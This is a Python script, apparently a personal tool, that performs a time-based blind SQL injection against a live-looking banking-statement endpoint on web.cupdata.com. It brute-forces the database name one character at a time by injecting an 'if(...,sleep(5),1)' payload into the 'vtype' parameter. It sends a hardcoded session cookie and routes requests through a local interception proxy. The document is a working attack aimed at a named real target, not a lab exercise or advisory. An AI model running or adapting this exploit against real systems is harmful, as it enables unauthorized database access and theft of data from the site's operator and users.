#!/usr/bin/python
# -*- coding:utf-8
'''垃圾sql延时注入脚本，不能跑数据库名长度，只能跑名字'''
import requests
import time

proxy= { "http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080", }
value = "0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
result = ""
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Cookie":"JSESSIONID=DAC0DD6BB45A4B2F0C89E5683D5AA52A; cookie-persist-47873=AIBBLNAKJABP"
}

def get_data(length):  # 获取数据
    global result
    for n in range(1, length):
        for v in value:
            payload = "2' and if((select ord(substring(database(),{1},1))) = {2},sleep(5),1) and '1'='1".format(data_payload, n,ord(v))
            data = {"vtype": payload}
            start_time = time.time()
            requests.packages.urllib3.disable_warnings()
            html = requests.post(url, data=data, headers=header, verify=False, proxies=proxy)
            end_time = time.time()
            use_time = end_time - start_time
            # 为啥把sleep时间设这么长呢？原因是我这里时常会出现网络波动，有时候请求时间就有2秒多，为避免出现乱码，所以设长一点可以保证信息的准确性
            if use_time > 3:
                result += v
                print("dbnamelen" + result)


url = "https://web.cupdata.com/cloudstmt/billDetailController/sendSms6100.htm"

data_payload = "select group_concat(table_name,0x7e)from information_schema.tables where table_schema=database()"
get_data(12)
print("dbname :" + result)
